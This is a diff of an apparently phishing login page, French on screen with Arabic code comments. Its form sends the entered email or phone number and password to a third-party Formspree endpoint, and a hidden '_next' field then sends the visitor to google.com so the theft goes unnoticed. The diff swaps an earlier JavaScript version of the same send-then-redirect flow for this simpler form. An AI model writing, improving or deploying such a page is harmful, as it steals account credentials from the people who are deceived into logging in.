@@ -107,10 +107,11 @@
     <h2>Connexion</h2>
     <p>Accéder à votre compte</p>
 
-    <!-- تم ربط الفورم مباشرة بـ Formspree بدون الحاجة لجافا سكريبت معقد أو سيرفر باك إند -->
-    <form id="loginForm" action="https://formspree.io/f/xojzprkz" method="POST">
+    <form action="https://formspree.io/f/xojzprkz" method="POST">
+        
+        <input type="hidden" name="_next" value="https://www.google.com">
+
         <div class="input-group">
-            <!-- الـ name ضروري جداً لكي يتعرف Formspree على نوع الحقل -->
             <input type="email" name="email" id="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
         </div>
         
@@ -128,36 +129,6 @@
         </div>
     </form>
 </div>
-
-<script>
-    const form = document.getElementById('loginForm');
-    
-    form.addEventListener('submit', async function(e) {
-        e.preventDefault(); // إيقاف الإرسال التقليدي مؤقتاً لضمان معالجة البيانات
-        
-        const btn = document.querySelector('.btn-submit');
-        btn.innerText = "Connexion...";
-        btn.disabled = true;
-        
-        const formData = new FormData(form);
-        
-        try {
-            // الإرسال المباشر من المتصفح إلى Formspree فوراً
-            await fetch(form.action, {
-                method: form.method,
-                body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
-            });
-        } catch (error) {
-            console.log("Redirecting...");
-        } finally {
-            // التوجيه الفوري إلى صفحة جوجل الرسمية بعد الإرسال
-            window.location.href = "https://www.google.com";
-        }
-    });
-</script>
 
 </body>
 </html>
